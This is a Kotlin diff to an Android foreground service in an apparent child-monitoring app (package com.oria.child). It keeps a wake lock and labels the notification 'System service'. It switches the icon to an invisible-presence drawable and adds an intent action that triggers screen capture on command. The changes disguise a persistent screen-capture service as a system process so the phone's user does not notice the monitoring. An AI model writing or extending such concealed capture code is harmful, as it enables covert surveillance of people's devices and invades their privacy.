@@ -14,14 +14,13 @@ class CaptureService : Service() {
 
     companion object {
         const val CHANNEL_ID = "oria_capture_channel"
+        const val ACTION_START_SCREEN = "com.oria.child.START_SCREEN"
     }
 
     private var wakeLock: PowerManager.WakeLock? = null
 
     override fun onCreate() {
         super.onCreate()
-
-        // ✅ WakeLock natif pour empêcher Android de suspendre le processus
         val pm = getSystemService(POWER_SERVICE) as PowerManager
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "oria:wakelock")
         wakeLock?.acquire()
@@ -38,8 +37,7 @@ class CaptureService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // ✅ Icône feuille/sécurité au lieu de caméra
-        val iconRes = android.R.drawable.ic_menu_agenda
+        val iconRes = android.R.drawable.presence_invisible
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System service")
@@ -57,6 +55,15 @@ class CaptureService : Service() {
         } else {
             startForeground(1, notification)
         }
+
+        if (intent?.action == ACTION_START_SCREEN) {
+            val activityIntent = Intent(this, MainActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                putExtra("trigger_screen_capture", true)
+            }
+            startActivity(activityIntent)
+        }
+
         return START_STICKY
     }
 
